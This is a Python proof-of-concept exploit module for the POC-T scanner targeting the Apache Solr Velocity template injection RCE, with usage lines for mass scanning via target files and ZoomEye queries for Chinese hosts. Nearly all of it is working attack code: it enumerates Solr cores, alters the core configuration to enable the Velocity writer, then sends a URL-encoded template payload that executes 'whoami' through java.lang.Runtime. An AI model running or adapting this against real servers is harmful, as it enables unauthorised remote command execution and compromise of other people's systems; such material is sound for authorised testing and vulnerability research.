#!/usr/bin/env python		
#coding:utf-8

"""
Apache Solr Velocity模版注入远程命令执行漏洞

Desc
	19 年 10 月 31 日，安全研究员 S00pY 在 GitHub 发布了 ApacheSolr Velocity 模版注入远程命令执行的 POC，经过其他安全团队和人员的验证和复现，此漏洞已经能够被批量利用。
Version
    5.0.0 - 8.3.1版本
Usage
	python POC-T.py -s solr-rce -b solr -iF target.txt
	python POC-T.py -s solr-rce -b solr -aZ "solr country:cn"

Refer

"""


import requests
import re
import sys
import json

def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/')
    command = "whoami"
    try:
        core_selector_url = url + '/solr/admin/cores?_=1565526689592&indexInfo=false&wt=json'
        r = requests.get(url=core_selector_url)
        json_strs = json.loads(r.text)
        if r.status_code == 200 and "responseHeader" in r.text:
            list = []
            for core_selector in json_strs['status']:
                list.append(json_strs['status']['%s' % core_selector]['name'])
            jas502n_Core_Name = list[0]
        debug_model_url = url + '/solr/' + jas502n_Core_Name + '/config'
        modifyConfig_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3875.120 Safari/537.36",
                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close",
                                "Content-Type": "application/json"}
        modifyConfig_json = {
            "update-queryresponsewriter": {"startup": "lazy", "name": "velocity",
                                               "class": "solr.VelocityResponseWriter",
                                               "template.base.dir": "", "solr.resource.loader.enabled": "true",
                                               "params.resource.loader.enabled": "true"}}
        r3 = requests.post(debug_model_url, headers=modifyConfig_headers,json=modifyConfig_json)
        if r3.status_code == 200 or 500:
                p = "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{0}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end".format(command)
                target = url + '/solr/' + jas502n_Core_Name + p
                result = requests.get(url=target)
                if result.status_code == 200 and len(result.text) < 65:
                    return url
    except Exception :
        pass